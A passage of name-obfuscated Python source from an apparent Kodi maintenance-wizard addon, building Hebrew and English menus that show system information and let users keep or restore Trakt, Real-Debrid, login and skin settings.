	OO0000OOOOOOO000O =wiz .convertSize (int (float (OOO0OO0O0OO0000O0 [13 ][:-2 ]))*1024 *1024 )#line:2209
	O00O0O0OOOO0OOO0O ,O0O0O0000OOO00000 ,O000OOO0O0000OO00 =getIP ()#line:2210
	OO00OOO00O0O0OO0O =[];O00000000OO0000O0 =[];O00000O0OO0O00000 =[];O00OOOOOO0OOO0O00 =[];OOO0OOOOOOO0OOOO0 =[];O0O0O00O0OO0OO0O0 =[];O00O00O0OO00OO0OO =[]#line:2212
	OO0000OO00O0OOO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2214
	for OO0OO00O0000000O0 in sorted (OO0000OO00O0OOO00 ,key =lambda OO00O0O0O00OO0OO0 :OO00O0O0O00OO0OO0 ):#line:2215
		OOOO00000OO000O0O =os .path .split (OO0OO00O0000000O0 [:-1 ])[1 ]#line:2216
		if OOOO00000OO000O0O =='packages':continue #line:2217
		OOO0O000O00000O00 =os .path .join (OO0OO00O0000000O0 ,'addon.xml')#line:2218
		if os .path .exists (OOO0O000O00000O00 ):#line:2219
			O00O00O0000OOO0O0 =open (OOO0O000O00000O00 )#line:2220
			O00OOO00OOO0000O0 =O00O00O0000OOO0O0 .read ()#line:2221
			O0OOOOOO00O0O0O00 =re .compile ("<provides>(.+?)</provides>").findall (O00OOO00OOO0000O0 )#line:2222
			if len (O0OOOOOO00O0O0O00 )==0 :#line:2223
				if OOOO00000OO000O0O .startswith ('skin'):O00O00O0OO00OO0OO .append (OOOO00000OO000O0O )#line:2224
				if OOOO00000OO000O0O .startswith ('repo'):OOO0OOOOOOO0OOOO0 .append (OOOO00000OO000O0O )#line:2225
				else :O0O0O00O0OO0OO0O0 .append (OOOO00000OO000O0O )#line:2226
			elif not (O0OOOOOO00O0O0O00 [0 ]).find ('executable')==-1 :O00OOOOOO0OOO0O00 .append (OOOO00000OO000O0O )#line:2227
			elif not (O0OOOOOO00O0O0O00 [0 ]).find ('video')==-1 :O00000O0OO0O00000 .append (OOOO00000OO000O0O )#line:2228
			elif not (O0OOOOOO00O0O0O00 [0 ]).find ('audio')==-1 :O00000000OO0000O0 .append (OOOO00000OO000O0O )#line:2229
			elif not (O0OOOOOO00O0O0O00 [0 ]).find ('image')==-1 :OO00OOO00O0O0OO0O .append (OOOO00000OO000O0O )#line:2230
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2232
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2233
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2234
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform_d ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2235
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2236
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2237
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2239
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2240
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2241
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2243
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000OOO0O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2244
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOOO00OOO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2245
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000OOOO0OO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2246
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2248
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOO0O00000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2249
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOO000O00O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2250
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOOOOOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2251
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2253
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2254
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0OOOO0OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2255
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0000OOO00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2256
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOO0O0000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2257
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0OO0000O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2258
	O0O00OO0OO0O0OO00 =len (OO00OOO00O0O0OO0O )+len (O00000000OO0000O0 )+len (O00000O0OO0O00000 )+len (O00OOOOOO0OOO0O00 )+len (O0O0O00O0OO0OO0O0 )+len (O00O00O0OO00OO0OO )+len (OOO0OOOOOOO0OOOO0 )#line:2260
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O00OO0OO0O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2261
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000O0OO0O00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2262
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOOOOO0OOO0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2263
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000000OO0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2264
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OOO00O0O0OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2265
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OOOOOOO0OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2266
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00O0OO00OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2267
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00O0OO0OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2268
def Menu ():#line:2269
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2270
def saveMenu ():#line:2272
	OO0O0OO000OO0000O ='[COLOR yellow]מופעל[/COLOR]';O00OOO000OOO00000 ='[COLOR blue]מבוטל[/COLOR]'#line:2274
	OOO00OOOO0000000O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2275
	OOO0OOO000O0OO0O0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2276
	O0OOO00OOOOO000O0 ='true'if KEEPINFO =='true'else 'false'#line:2277
	O00OOO000000O00OO ='true'if KEEPSOUND =='true'else 'false'#line:2279
	OOOOOO00OO00O0OOO ='true'if KEEPVIEW =='true'else 'false'#line:2280
	OOOOO00OOOO00OOOO ='true'if KEEPSKIN =='true'else 'false'#line:2281
	O0OO0000O000000OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2282
	O0O0OOO000O000OOO ='true'if KEEPSKIN3 =='true'else 'false'#line:2283
	OO000O00OO0000OO0 ='true'if KEEPADDONS =='true'else 'false'#line:2284
	O00O0O00000O0O0OO ='true'if KEEPPVR =='true'else 'false'#line:2285
	O000000O00OOOO0OO ='true'if KEEPTVLIST =='true'else 'false'#line:2286
	O00OOO00O00O0OOO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2287
	O00O0OO00OOOO0O00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2288
	OO0O00OOO0OO0OOO0 ='true'if KEEPHUBTV =='true'else 'false'#line:2289
	O0OOO0O000000OO00 ='true'if KEEPHUBVOD =='true'else 'false'#line:2290
	O000OOO0000OOOO00 ='true'if KEEPHUBSPORT =='true'else 'false'#line:2291
	OO00O0OO0OOO0OOOO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2292
	OOOO00OO000O000O0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2293
	O00OO0O00OOOOOOOO ='true'if KEEPHUBMENU =='true'else 'false'#line:2294
	O0OOO0OOO0OOO0OOO ='true'if KEEPPLAYLIST =='true'else 'false'#line:2295
	O0O0OOOOOO00O0O00 ='true'if KEEPTRAKT =='true'else 'false'#line:2296
	OOO0O0OOOOOO00OOO ='true'if KEEPREAL =='true'else 'false'#line:2297
	OOOOO00O00O0OO000 ='true'if KEEPRD2 =='true'else 'false'#line:2298
	OOO0O00OO000O00O0 ='true'if KEEPTORNET =='true'else 'true'#line:2299
	OOOOO00OOO00000OO ='true'if KEEPLOGIN =='true'else 'false'#line:2300
	OOO000OOOOO00O0O0 ='true'if KEEPSOURCES =='true'else 'false'#line:2301
	OOOO000O0O00O0OOO ='true'if KEEPADVANCED =='true'else 'false'#line:2302
	O000O00OO0OOOO00O ='true'if KEEPPROFILES =='true'else 'false'#line:2303
	OO0O0O0O0OOO0O00O ='true'if KEEPFAVS =='true'else 'false'#line:2304
	O0OO0OOO0O0OOOOO0 ='true'if KEEPREPOS =='true'else 'false'#line:2305
	OOO00O00OO0OOOOOO ='true'if KEEPSUPER =='true'else 'false'#line:2306
	OO0O0O00OO0OO0O0O ='true'if KEEPWHITELIST =='true'else 'false'#line:2307
	O0O00O0O0O00OOO0O ='true'if KEEPWEATHER =='true'else 'false'#line:2308
	O0OO000OO0000OOOO ='true'if KEEPVICTORY =='true'else 'false'#line:2309
	O0OO0O0O0O0000O00 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:2310
	if OO0O0O00OO0OO0O0O =='true':#line:2312
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2313
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2314
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2315
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2316
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2317
	addFile ('%s שמירת חשבון RD:  '%OOO0O0OOOOOO00OOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2320
	addFile ('%s שמירת חשבון טראקט:  '%O0O0OOOOOO00O0O00 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2321
	addFile ('%s שמירת מועדפים:  '%OO0O0O0O0OOO0O00O .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2324
	addFile ('%s שמירת לקוח טלוויזיה:  '%O00O0O00000O0O0OO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2325
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0OO000OO0000OOOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:2326
	addFile ('%s שמירת חשבון טלמדיה:  '%O0OO0O0O0O0000O00 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:2327
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O000000O00OOOO0OO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2328
	addFile ('%s שמירת אריח סרטים:  '%O00OOO00O00O0OOO0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2329
	addFile ('%s שמירת אריח סדרות:  '%O00O0OO00OOOO0O00 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2330
	addFile ('%s שמירת אריח טלויזיה:  '%OO0O00OOO0OO0OOO0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2331
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OOO0O000000OO00 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2332
	addFile ('%s שמירת אריח ספורט:  '%O000OOO0000OOOO00 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2333
	addFile ('%s שמירת אריח ילדים:  '%OO00O0OO0OOO0OOOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2334
	addFile ('%s שמירת אריח מוסיקה:  '%OOOO00OO000O000O0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2335
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00OO0O00OOOOOOOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2336
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOOO00OOOO00OOOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2337
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0O00O0O0O00OOO0O .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:2338
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO000O00OO0000OO0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2344
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OOO00OOOOO000O0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2345
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO0OOO000O0OO0O0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2348
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOO000OOOOO00O0O0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2349
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O00OOO000000O00OO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2350
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OOOOOO00OO00O0OOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2352
	addFile ('%s שמירת פליליסט לאודר:  '%O0OOO0OOO0OOO0OOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2353
	addFile ('%s שמירת הגדרות באפר: '%OOOO000O0O00O0OOO .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2358
	addFile ('%s שמירת רשימות ריפו:  '%O0OO0OOO0O0OOOOO0 .replace ('true',OO0O0OO000OO0000O ).replace ('false',O00OOO000OOO00000 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2360
	setView ('files','viewType')#line:2362
def traktMenu ():#line:2364
	O000O000OOO000O0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2365
	O0000OOOOO0O0OO0O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2366
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2367
	addFile ('Save Trakt Data: %s'%O000O000OOO000O0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2368
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0000OOOOO0O0OO0O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2369
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2370
	for O000O000OOO000O0O in traktit .ORDER :#line:2372
		O0OO00OO0OO0OOOOO =TRAKTID [O000O000OOO000O0O ]['name']#line:2373
		O0OOO0O0O0O00OOO0 =TRAKTID [O000O000OOO000O0O ]['path']#line:2374
		OOOOO0OOO0OO000O0 =TRAKTID [O000O000OOO000O0O ]['saved']#line:2375
		OO0OO0000OO000OO0 =TRAKTID [O000O000OOO000O0O ]['file']#line:2376
		O0O0O00OOO0O00000 =wiz .getS (OOOOO0OOO0OO000O0 )#line:2377
		OO0OOOO0O0OO0O0OO =traktit .traktUser (O000O000OOO000O0O )#line:2378
		O0000O0O00OO0000O =TRAKTID [O000O000OOO000O0O ]['icon']if os .path .exists (O0OOO0O0O0O00OOO0 )else ICONTRAKT #line:2379
		O0OOOOOOO00O0OO0O =TRAKTID [O000O000OOO000O0O ]['fanart']if os .path .exists (O0OOO0O0O0O00OOO0 )else FANART #line:2380
		OOO00O00OOO00OO00 =createMenu ('saveaddon','Trakt',O000O000OOO000O0O )#line:2381
		OO000OOOOOO00000O =createMenu ('save','Trakt',O000O000OOO000O0O )#line:2382
		OOO00O00OOO00OO00 .append ((THEME2 %'%s Settings'%O0OO00OO0OO0OOOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O000O000OOO000O0O )))#line:2383
		addFile ('[+]-> %s'%O0OO00OO0OO0OOOOO ,'',icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,themeit =THEME3 )#line:2385
		if not os .path .exists (O0OOO0O0O0O00OOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,menu =OOO00O00OOO00OO00 )#line:2386
		elif not OO0OOOO0O0OO0O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O000O000OOO000O0O ,icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,menu =OOO00O00OOO00OO00 )#line:2387
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOOO0O0OO0O0OO ,'authtrakt',O000O000OOO000O0O ,icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,menu =OOO00O00OOO00OO00 )#line:2388
		if O0O0O00OOO0O00000 =="":#line:2389
			if os .path .exists (OO0OO0000OO000OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O000O000OOO000O0O ,icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,menu =OO000OOOOOO00000O )#line:2390
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O000O000OOO000O0O ,icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,menu =OO000OOOOOO00000O )#line:2391
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O00OOO0O00000 ,'',icon =O0000O0O00OO0000O ,fanart =O0OOOOOOO00O0OO0O ,menu =OO000OOOOOO00000O )#line:2392
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2394
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2395
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2396
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2397
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2398
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2399
	setView ('files','viewType')#line:2400
def realMenu ():#line:2402
	O0O0O0OO0OOO000O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2403
	O000O0OOO0OO00OOO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2404
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2405
	addFile ('Save Real Debrid Data: %s'%O0O0O0OO0OOO000O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2406
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O000O0OOO0OO00OOO ),'',icon =ICONREAL ,themeit =THEME3 )#line:2407
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2408
	for O0O0O0OO0O000O00O in debridit .ORDER :#line:2410
		OO00O0OO000OO0OO0 =DEBRIDID [O0O0O0OO0O000O00O ]['name']#line:2411
		O0OO0000OO000OO00 =DEBRIDID [O0O0O0OO0O000O00O ]['path']#line:2412
		OO0OO0O0O0O0OOOOO =DEBRIDID [O0O0O0OO0O000O00O ]['saved']#line:2413
		OO00O00OOOO00OO00 =DEBRIDID [O0O0O0OO0O000O00O ]['file']#line:2414
		OO0O0O000OO0O0OO0 =wiz .getS (OO0OO0O0O0O0OOOOO )#line:2415
		OOOOO00O00O0O00OO =debridit .debridUser (O0O0O0OO0O000O00O )#line:2416
		O000OOO000O0OO0O0 =DEBRIDID [O0O0O0OO0O000O00O ]['icon']if os .path .exists (O0OO0000OO000OO00 )else ICONREAL #line:2417
		O0O0O0O0OOO0O0000 =DEBRIDID [O0O0O0OO0O000O00O ]['fanart']if os .path .exists (O0OO0000OO000OO00 )else FANART #line:2418
		OO00O0OOO0O00O000 =createMenu ('saveaddon','Debrid',O0O0O0OO0O000O00O )#line:2419
		OOO0O0O0000OO0OO0 =createMenu ('save','Debrid',O0O0O0OO0O000O00O )#line:2420
		OO00O0OOO0O00O000 .append ((THEME2 %'%s Settings'%OO00O0OO000OO0OO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0O0O0OO0O000O00O )))#line:2421
		addFile ('[+]-> %s'%OO00O0OO000OO0OO0 ,'',icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,themeit =THEME3 )#line:2423
		if not os .path .exists (O0OO0000OO000OO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,menu =OO00O0OOO0O00O000 )#line:2424
		elif not OOOOO00O00O0O00OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0O0O0OO0O000O00O ,icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,menu =OO00O0OOO0O00O000 )#line:2425
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO00O00O0O00OO ,'authdebrid',O0O0O0OO0O000O00O ,icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,menu =OO00O0OOO0O00O000 )#line:2426
		if OO0O0O000OO0O0OO0 =="":#line:2427
			if os .path .exists (OO00O00OOOO00OO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0O0O0OO0O000O00O ,icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,menu =OOO0O0O0000OO0OO0 )#line:2428
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0O0O0OO0O000O00O ,icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,menu =OOO0O0O0000OO0OO0 )#line:2429
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0O000OO0O0OO0 ,'',icon =O000OOO000O0OO0O0 ,fanart =O0O0O0O0OOO0O0000 ,menu =OOO0O0O0000OO0OO0 )#line:2430
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2432
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2433
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2434
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2435
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2436
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2437
	setView ('files','viewType')#line:2438
def loginMenu ():#line:2440
	OOO00O0OO0O00O00O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2441
	OOO000O000O0OO00O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2442
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2443
	addFile ('Save Login Data: %s'%OOO00O0OO0O00O00O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2444
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO000O000O0OO00O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2445
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2446
	for OOO00O0OO0O00O00O in loginit .ORDER :#line:2448
		OO0000OO0O0OO0OO0 =LOGINID [OOO00O0OO0O00O00O ]['name']#line:2449
		OOOOO000O0OO00O00 =LOGINID [OOO00O0OO0O00O00O ]['path']#line:2450
